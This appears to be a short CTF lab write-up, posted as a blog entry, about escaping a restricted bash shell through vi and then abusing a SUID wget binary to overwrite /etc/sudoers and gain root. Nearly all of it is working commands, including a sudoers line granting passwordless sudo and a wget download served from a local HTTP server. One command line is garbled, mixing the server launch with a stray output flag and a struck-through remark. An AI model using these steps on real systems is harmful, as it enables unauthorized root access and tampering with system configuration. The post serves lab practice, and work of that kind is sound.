---
layout: single
title: "PrivEsc abusing WGET SUID"
date: 2020-04-04 00:22:00 -0000
categories: ctflive privesc
permalink: /ctflive/wgetsuid
tags: [privesc, wget, SUID]

---

https://www.ctf.live/challengedetails?cid=21
##### escape restricted shell
`fesal@rbash_attackdefense:~$`
~~~~
:set shell=/bin/bash
:shell
export PATH=.bin:/usr/bin/
echo $PATH
~~~~
##### use wget SUID to transfer file to /etc/sudoers
~~~~
cd /tmp
vi sudoers
:i[enter] - to edit file
fesal ALL=(ALL) NOPASSWD:ALL
:wq - - to save exit file
~~~~
~~~~
python -m SimpleHTTPServer 8009 & -O /etc/sudoers ~~[why need '&' - to use terminal and simpleServer works in bg]~~
export URL=http://127.0.0.1:8009/sudoers
export LFILE=/etc/sudoers
wget $URL -O $LFILE
sudo -i 
~~~~
`root@rbash_attackdefense:~$`
